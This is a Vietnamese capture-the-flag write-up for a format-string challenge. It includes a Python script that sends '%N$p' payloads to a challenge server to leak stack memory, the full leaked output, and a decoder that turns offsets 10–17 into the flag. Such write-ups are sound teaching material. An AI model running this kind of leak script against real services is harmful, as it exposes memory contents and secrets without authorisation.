<img width="542" height="213" alt="image" src="https://github.com/user-attachments/assets/38d82ef6-1ce2-450b-8f89-84052a38be99" />  

Kiểm tra cơ bản:  

<img width="888" height="215" alt="image" src="https://github.com/user-attachments/assets/00e2b428-0f4a-4b3d-9489-0a72968da01a" />  

Phân tích bằng IDA:  

<img width="861" height="476" alt="image" src="https://github.com/user-attachments/assets/65f0d4a7-9265-45a5-8800-2319ad618683" />  

Lỗ hổng ở vị trí:  

<img width="423" height="127" alt="image" src="https://github.com/user-attachments/assets/967c4d4c-54e8-434f-bc10-226e38c4ffa9" />  

`printf(format);` là lỗ hổng format string, vì dữ liệu người dùng nhập (format) được truyền trực tiếp mà không có định dạng `(%s, %d, v.v.).`  
Nghĩa là chỉ cần nhập thêm gì đó, hệ thống tự in ra những thứ không cần thiết.  
Mục tiêu sẽ là đưa rất nhiều payload vào hệ thống và để nó in ra vị trí (offset) đang lưu giá trị của : <img width="254" height="43" alt="image" src="https://github.com/user-attachments/assets/0a1df5fb-ac19-4fa1-bc48-18b8ce5336ac" />  

Script khai thác để in ra vị trí offset từ 1-50:  
```python
import socket
import time

HOST = "43.205.113.100"
PORT = 8233

for i in range(1, 50):
    try:
        with socket.create_connection((HOST, PORT), timeout=2) as s:
            payload = f"Y\n%{i}$p\n"
            s.sendall(payload.encode())

            time.sleep(0.2)  # Cho server có thời gian trả lời

            response = b""
            while True:
                try:
                    part = s.recv(1024)
                    if not part:
                        break
                    response += part
                except socket.timeout:
                    break

            print(f"Offset {i}: {response.decode(errors='ignore')}")
    except Exception as e:
        print(f"Offset {i}: ERROR - {e}")

```
Output thu được tương tứng:  
```vim

Offset 1:  0x5a8acc5951b0
Offset 2:  (nil)
Offset 3:  0x734b753cba00
Offset 4:  (nil)
Offset 5:  0x5d0722cde8a0
Offset 6:  0x7ffddb3a2628
Offset 7:  0x100000000
Offset 8:  0x5900000000000002
Offset 9:  0x57b9faced2a0
Offset 10:  0x746369746b616873
Offset 11:  0x58655f3368747b66
Offset 12:  0x5f64337463407274
Offset 13:  0x656974696c696240
Offset 14:  0x6873316e40765f35
Offset 15:  0x3368745f7475625f
Offset 16:  0x33725f67406c665f
Offset 17:  0x7d736e31406d
Offset 18:  0x7024383125
Offset 19:  0x1
Offset 20:  0x652ce40b5040
Offset 21:  0x7682de38383c
Offset 22:  0x6f0
Offset 23:  0x7ffdcb9f9a09
Offset 24:  0x7605a046b000
Offset 25:  0x10101000000
Offset 26:  0x2
Offset 27:  0x178bfbff
Offset 28:  0x7ffc40bbd3e9
Offset 29:  0x64
Offset 30:  0x1000
Offset 31:  0x8a4bdf4856d41b00
Offset 32:  0x1
Offset 33:  0x740b5a72bd90
Offset 34:  (nil)
Offset 35:  0x5aed69ec11e9
Offset 36:  0x1d1b7f1d0
Offset 37:  0x7ffe5c35ec78
Offset 38:  (nil)
Offset 39:  0x6d41aa7d5c4126ff
Offset 40:  0x7ffda573b858
Offset 41:  0x5c35bfcf81e9
Offset 42:  0x5c3243362d98
Offset 43:  0x707850813040
Offset 44:  0xcf4095078ccd63b1
Offset 45:  0xb689b8f6339070ce
Offset 46:  0x720100000000
Offset 47:  (nil)
Offset 48:  (nil)
Offset 49:  (nil)
Offset 50:  (nil)
```
Có thể thấy offset từ vị trí 10-17 khá nghi ngờ ( thật ra là cứ mò bừa tự nhiên nó ra :v ).  
Chuyển từ hex về ASCII là được:  
```python
chunks = [
    0x746369746b616873,
    0x58655f3368747b66,
    0x5f64337463407274,
    0x656974696c696240,
    0x6873316e40765f35,
    0x3368745f7475625f,
    0x33725f67406c665f,
    0x7d736e31406d,
]

flag = b''.join(x.to_bytes(8, 'little') for x in chunks).rstrip(b'\x00')
print(flag.decode())
```
> Mỗi phần tử là một số nguyên 64-bit biểu diễn dưới dạng hex.  
> Các số này được lưu theo little-endian (byte thấp nhất ở vị trí thấp nhất).  
> Mỗi số nguyên được chuyển thành 8 bytes, giữ nguyên thứ tự little-endian  

Peace!



 




